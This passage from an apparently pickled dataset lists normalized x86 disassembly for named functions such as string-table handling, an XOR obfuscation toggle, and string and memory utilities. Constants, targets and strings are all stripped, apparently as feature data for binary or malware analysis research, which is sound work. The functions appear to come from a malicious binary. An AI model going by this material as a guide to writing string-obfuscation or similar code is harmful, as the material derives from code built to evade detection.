FOO\nSUB~[EBX+0],0\nADD~ESP,0\nMOV~EAX,[ESP+0]\nMOV~DWORDPTR[EAX],0\nMOV~EDX,[EBX+0]\nLEA~ECX,[EBX+0]\nMOV~[ESP+0],ECX\nPUSH~0\nMOV~EAX,0\nSUB~EAX,EDX\nPUSH~EAX\nADD~EDX,ECX\nPUSH~EDX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EAX,[ESP+0]\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nCMP~EAX,0\nJNZ~FOO\nMOV~EDX,[ESP+0]\nCMP~DWORDPTR[EDX],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~[EBX+0],0\nMOV~AL,[EBX+0]\nINC~EAX\nMOV~[EBX+0],AL\nADD~ESP,0\nCMP~AL,0\nJBE~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nJMP~FOO\nADD~[EBX+0],EAX\nMOV~EAX,<STR>\nMOV~[EBX+0],EAX\nCMP~[EBX+0],0\nJA~FOO\nMOV~EAX,[EBX+0]\nJMP~<STR>\nLEA~EDI,[EBX+0]\nMOV~EBP,0\nJMP~FOO\nCMP~BYTEPTR[EDI],0\nJNZ~FOO\nMOV~ECX,0\nMOV~EDX,EDI\nMOV~EAX,EBX\nCALL~FOO\nTEST~AL,AL\nJZ~FOO\nMOV~AL,[EDI+0]\nCMP~AL,0\nJNZ~FOO\nADD~EDI,0\nADD~EBP,0\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~ECX,0\nMOV~EDX,EDI\nMOV~EAX,EBX\nCALL~FOO\nTEST~AL,AL\nJZ~FOO\nCMP~[EDI+0],0\nJNZ~FOO\nADD~EDI,0\nADD~EBP,0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~ECX,0\nMOV~EDX,EDI\nMOV~EAX,EBX\nCALL~FOO\nTEST~AL,AL\nJNZ~FOO\nJMP~FOO\nMOV~DL,[EAX+EDI-0]\nCMP~DL,0\nJNZ~FOO\nMOV~[EAX+EDI-0],0\nJMP~FOO\nCMP~DL,0\nJNZ~FOO\nMOV~[EAX+EDI-0],0\nINC~EAX\nCMP~EAX,0\nJNZ~FOO\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~[EBX+0]\nCALL~FOO\nADD~EDI,0\nADD~EBP,0\nADD~ESP,0\nCMP~EBP,[EBX+0]\nJL~FOO\nTEST~EBP,EBP\nJLE~FOO\nMOV~[EBX+0],0\nJMP~FOO\nMOV~ECX,[EBX+0]\nLEA~EAX,[ECX-0]\nTEST~EAX,EAX\nJLE~FOO\nMOV~DL,[EAX+EBX+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nJMP~FOO\nMOV~DL,[EAX+EBX+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nLEA~EBP,[EAX+0]\nCMP~EBP,0\nJNZ~FOO\nJMP~FOO\nDEC~EAX\nJNZ~FOO\nPUSH~0\nPUSH~0\nPUSH~ECX\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EBP,EAX\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EBP,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nTEST~EBP,EBP\nJLE~FOO\nMOV~EDX,[EBX]\nPUSH~0\nMOV~EAX,0\nMOV~AL,[EDX+0]\nPUSH~EAX\nPUSH~DWORDPTR[EDX]\nPUSH~[EBX+0]\nCALL~FOO\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~[EBX+0],0\nADD~ESP,0\nJMP~FOO\nMOV~ECX,[EBX+0]\nLEA~EAX,[ECX-0]\nTEST~EAX,EAX\nJLE~FOO\nMOV~DL,[EAX+EBX+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nJMP~FOO\nMOV~DL,[EAX+EBX+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nLEA~EBP,[EAX+0]\nCMP~EBP,0\nJNZ~FOO\nJMP~FOO\nDEC~EAX\nJNZ~FOO\nPUSH~0\nPUSH~0\nPUSH~ECX\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EBP,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nTEST~EBP,EBP\nJLE~FOO\nMOV~EDX,[EBX]\nPUSH~0\nMOV~EAX,0\nMOV~AL,[EDX+0]\nPUSH~EAX\nPUSH~[EDX+0]\nPUSH~[EBX+0]\nCALL~FOO\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~[EBX+0],0\nADD~ESP,0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nMOV~EBP,EAX\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~[ESP+0]\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[EBX+0],0\nADD~ESP,0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nMOV~EBP,EAX\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~[ESP+0]\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[EBX+0],0\nADD~ESP,0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nMOV~EBP,EAX\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~[ESP+0]\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[EBX+0],0\nADD~ESP,0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nMOV~EBP,EAX\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~[ESP+0]\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[EBX+0],0\nADD~ESP,0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nMOV~EBP,EAX\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~[ESP+0]\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[EBX+0],0\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nDEC~EDX\nPUSH~EDX\nPUSH~EAX\nPUSH~[EBX+0]\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~[EBX+0],0\nMOV~AL,[EBX+0]\nINC~EAX\nMOV~[EBX+0],AL\nADD~ESP,0\nCMP~AL,0\nJNZ~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nDEC~EDX\nPUSH~EDX\nPUSH~EAX\nPUSH~[EBX+0]\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EBP,EAX\nADD~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~EBP,0\nJNZ~FOO\nJMP~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~EBP,0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nMOV~EBP,0\nJMP~FOO\nMOV~ECX,[EBX]\nMOV~[ESP+0],ECX\nMOV~EDX,[EBX+0]\nMOV~EAX,[EBX+0]\nMOV~[ESP+0],EAX\nMOV~[ESP+0],DX\nCALL~FOO\nTEST~EAX,EAX\nJG~FOO\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~ESI,EAX\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EAX\nCALL~FOO\nMOV~EDI,EAX\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~[ESP+0],0\nMOV~EBX,[EAX+0]\nCALL~FOO\nMOV~EDX,0\nMOV~DL,[EDI]\nMOV~ECX,EDX\nMOV~EDX,0\nDIV~,ECX\nMOV~EAX,[EBX+EDX*4]\nMOV~[ESP+0],EAX\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~AX,[EAX]\nMOV~[ESP+0],AX\nMOV~[ESP],EDI\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nLEA~EAX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP+0],0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nMOV~EDX,[ESP+0]\nMOV~EAX,0\nMOV~AL,[EDX+0]\nPUSH~EAX\nPUSH~DWORDPTR[EDX]\nPUSH~ESI\nCALL~FOO\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nMOV~ECX,[ESP+0]\nMOV~EAX,0\nMOV~AL,[ECX+0]\nPUSH~EAX\nPUSH~[ECX+0]\nPUSH~ESI\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nSUB~ESP,0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nADD~ESP,0\nJMP~FOO\nMOV~EBP,0\nTEST~EBP,EBP\nJZ~FOO\nMOV~EDX,[EBX+0]\nMOV~EAX,EDX\nCMP~EDX,EBP\nJLE~FOO\nMOV~EDX,EBP\nSUB~EAX,EDX\nMOV~[EBX+0],EAX\nSUB~ESP,0\nPUSH~EAX\nMOV~EAX,[ESP+0]\nADD~EAX,EDX\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nCMP~EAX,0\nJLE~FOO\nJMP~FOO\nMOV~EAX,0\nJMP~FOO\nTEST~EBP,EBP\nJG~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p146
L5557L
tp147
a(S'table_retrieve_val'
p148
S'"MOV~ECX,[ESP+0]\nMOV~EAX,[ESP+0]\nLEA~EDX,<STR>\nTEST~ECX,ECX\nJZ~FOO\nMOV~EAX,[EDX+0]\nAND~EAX,0\nMOV~[ECX],EAX\nMOV~EAX,[EDX]\nRETN"'
p149
L32L
tp150
a(S'toggle_obf'
p151
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nAND~EAX,0\nLEA~ECX,<STR>\nMOV~EAX,<STR>\nMOV~EBP,EAX\nMOV~EDI,EAX\nSHR~EDI,0\nMOV~ESI,EAX\nSHR~ESI,0\nSHR~EAX,0\nMOV~[ESP],AL\nCMP~[ECX+0],0\nJZ~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nADD~EAX,[ECX]\nMOV~EBX,EBP\nXOR~[EAX],BL\nMOV~EAX,EDX\nADD~EAX,[ECX]\nMOV~EBX,EDI\nXOR~[EAX],BL\nMOV~EAX,EDX\nADD~EAX,[ECX]\nMOV~EBX,ESI\nXOR~[EAX],BL\nMOV~EAX,EDX\nADD~EAX,[ECX]\nMOV~BL,[ESP]\nXOR~[EAX],BL\nINC~EDX\nMOV~EAX,[ECX+0]\nAND~EAX,0\nCMP~EAX,EDX\nJG~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p152
L108L
tp153
a(S'table_lock_val'
p154
S'"SUB~ESP,0\nMOV~EAX,0\nMOV~AL,[ESP+0]\nCALL~FOO\nADD~ESP,0\nRETN"'
p155
L21L
tp156
a(S'table_unlock_val'
p157
S'"SUB~ESP,0\nMOV~EAX,0\nMOV~AL,[ESP+0]\nCALL~FOO\nADD~ESP,0\nRETN"'
p158
L21L
tp159
a(S'add_entry'
p160
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,EDX\nMOV~EBX,ECX\nMOV~EBP,EAX\nPUSH~ECX\nCALL~FOO\nMOV~ESI,EAX\nADD~ESP,0\nPUSH~EBX\nPUSH~EDI\nPUSH~EAX\nCALL~FOO\nMOV~EAX,EBP\nAND~EAX,0\nMOV~<STR>,ESI\nMOV~<STR>,BX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p161
L62L
tp162
a(S'table_init'
p163
S'"SUB~ESP,0\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nADD~ESP,0\nRETN"'
p164
L1007L
tp165
a(S'util_strlen'
p166
S'"MOV~EDX,[ESP+0]\nMOV~EAX,0\nCMP~BYTEPTR[EDX],0\nJZ~FOO\nMOV~EAX,0\nINC~EAX\nCMP~BYTEPTR[EAX+EDX],0\nJNZ~FOO\nRETN"'
p167
L27L
tp168
a(S'util_strncmp'
p169
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nMOV~EBP,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~ESI,[ESP+0]\nPUSH~EBP\nCALL~FOO\nMOV~EBX,EAX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nCMP~EBX,ESI\nJL~FOO\nCMP~EAX,ESI\nJL~FOO\nJMP~FOO\nMOV~AL,[EBP+0]\nCMP~AL,[EDI]\nJNZ~FOO\nINC~EBP\nINC~EDI\nDEC~ESI\nCMP~ESI,0\nJNZ~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p170
L75L
tp171
a(S'util_strcmp'
p172
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nMOV~EDI,[ESP+0]\nMOV~ESI,[ESP+0]\nPUSH~EDI\nCALL~FOO\nMOV~EBX,EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EBX,EAX\nJNZ~FOO\nJMP~FOO\nMOV~AL,[EDI]\nCMP~AL,[ESI]\nJNZ~FOO\nINC~EDI\nINC~ESI\nDEC~EBX\nCMP~EBX,0\nJNZ~FOO\nMOV~EAX,0\nJMP~FOO\nMOV~EAX,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p173
L64L
tp174
a(S'util_memcpy'
p175
S'"PUSH~ESI\nPUSH~EBX\nMOV~ESI,[ESP+0]\nTEST~ESI,ESI\nJZ~FOO\nMOV~EBX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,0\nMOV~AL,[EDX+ECX]\nMOV~[EDX+EBX],AL\nINC~EDX\nCMP~EDX,ESI\nJNZ~FOO\nPOP~EBX\nPOP~ESI\nRETN"'
p176
L37L
tp177
a(S'util_strcpy'
p178
S'"PUSH~ESI\nPUSH~EBX\nMOV~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~ESI,EAX\nLEA~EAX,[EAX+0]\nPUSH~EAX\nPUSH~EBX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EAX,ESI\nPOP~EBX\nPOP~ESI\nRETN"'
p179
L36L
tp180
a(S'util_zero'
p181
S'"MOV~ECX,[ESP+0]\nTEST~ECX,ECX\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,0\nMOV~BYTEPTR[EAX+EDX],0\nINC~EAX\nCMP~EAX,ECX\nJNZ~FOO\nRETN"'
p182
L27L
tp183
a(S'util_itoa'
p184
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~EDI,[ESP+0]\nTEST~EDI,EDI\nJZ~FOO\nTEST~EAX,EAX\nJZ~FOO\nMOV~[ESP+0],0\nCMP~EDX,0\nJNZ~FOO\nTEST~EAX,EAX\nJNS~FOO\nMOV~ECX,EAX\nNEG~ECX\nJZ~FOO\nMOV~EBP,0\nJMP~FOO\nMOV~ECX,EAX\nMOV~EBP,0\nMOV~ESI,0\nMOV~EBX,EDX\nMOV~EAX,ECX\nMOV~EDX,0\nDIV~,EBX\nLEA~EAX,[EDX+0]\nCMP~EDX,0\nJLE~FOO\nLEA~EAX,[EDX+0]\nMOV~[ESP+ESI+0],AL\nMOV~EAX,ECX\nMOV~EDX,0\nDIV~,EBX\nMOV~ECX,EAX\nDEC~ESI\nTEST~EAX,EAX\nJNZ~FOO\nTEST~EBP,EBP\nJZ~FOO\nMOV~[ESP+ESI+0],0\nJMP~FOO\nINC~ESI\nLEA~EAX,[ESP+ESI+0]\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~BYTEPTR[EDI],0\nMOV~[EDI+0],0\nJMP~FOO\nMOV~ESI,0\nJMP~FOO\nMOV~EAX,EDI\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p185
L166L
tp186
a(S'util_memsearch'
p187
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nMOV~EBP,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~ESI,[ESP+0]\nCMP~ESI,ECX\nJG~FOO\nTEST~ECX,ECX\nJLE~FOO\nMOV~EDX,0\nMOV~EBX,0\nMOV~AL,[EDX+EBP]\nCMP~AL,[EBX+EDI]\nJNZ~FOO\nINC~EBX\nCMP~ESI,EBX\nJNZ~FOO\nLEA~EAX,[EDX+0]\nJMP~FOO\nMOV~EBX,0\nINC~EDX\nCMP~ECX,EDX\nJNZ~FOO\nMOV~EAX,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p188
L76L
tp189
a(S'util_stristr'
p190
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBP,[ESP+0]\nPUSH~EBP\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~EBX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EDI,0\nADD~ESP,0\nJMP~FOO\nMOV~CL,[ESI]\nINC~ESI\nMOV~DL,[EBP+EDI+0]\nLEA~EAX,[ECX-0]\nCMP~AL,0\nJA~FOO\nOR~ECX,0\nLEA~EAX,[EDX-0]\nCMP~AL,0\nJA~FOO\nOR~EDX,0\nCMP~CL,DL\nJNZ~FOO\nINC~EDI\nCMP~[ESP],EDI\nJNZ~FOO\nMOV~EAX,ESI\nSUB~EAX,[ESP+0]\nJMP~FOO\nMOV~EDI,0\nDEC~EBX\nTEST~EBX,EBX\nJG~FOO\nMOV~EAX,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p191
L107L
tp192
a(S'util_atoi'
p193
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOV~DL,[EBX]\nMOVSX~ECX,DL\nINC~EBX\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nJMP~FOO\nMOVSX~ECX,BYTEPTR[EAX]\nLEA~EBX,[EAX+0]\nMOV~EAX,0\nMOV~[ESP+0],0\nJMP~FOO\nCMP~DL,0\nJNZ~FOO\nMOVSX~ECX,BYTEPTR[EAX]\nLEA~EBX,[EAX+0]\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~[ESP],EDX\nMOV~EDX,0\nDIV~,DWORDPTR[ESP]\nMOV~[ESP+0],EDX\nMOV~[ESP+0],EAX\nMOV~EBP,0\nMOV~EDI,0\nMOV~DL,CL\nLEA~EAX,[EDX-0]\nCMP~AL,0\nJA~FOO\nLEA~EDX,[ECX-0]\nJMP~FOO\nLEA~EAX,[EDX-0]\nCMP~AL,0\nSETBE~AL\nAND~EAX,0\nMOV~ESI,EAX\nTEST~EAX,EAX\nJNZ~FOO\nLEA~EAX,[EDX-0]\nCMP~AL,0\nJA~FOO\nCMP~ESI,0\nSBB~EAX,EAX\nAND~EAX,0\nADD~EAX,0\nMOV~EDX,ECX\nSUB~EDX,EAX\nCMP~EDX,[ESP+0]\nJGE~FOO\nTEST~EDI,EDI\nJS~FOO\nCMP~EBP,[ESP+0]\nJA~FOO\nCMP~EBP,[ESP+0]\nJNZ~FOO\nCMP~EDX,[ESP+0]\nJG~FOO\nMOV~EAX,[ESP]\nIMUL~EAX,EBP\nLEA~EBP,[EAX+EDX]\nMOV~EDI,0\nJMP~FOO\nMOV~EDI,0\nMOVSX~ECX,BYTEPTR[EBX]\nINC~EBX\nJMP~FOO\nTEST~EDI,EDI\nJNS~FOO\nCMP~[ESP+0],0\nSBB~EBP,EBP\nSUB~EBP,0\nJMP~FOO\nCMP~[ESP+0],0\nJZ~FOO\nNEG~EBP\nJMP~FOO\nMOV~EAX,EBX\nCMP~DL,0\nJNZ~FOO\nJMP~FOO\nMOV~EAX,0\nMOV~[ESP+0],0\nJMP~FOO\nMOV~EAX,EBP\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p194
L295L
tp195
a(S'util_fdgets'
p196
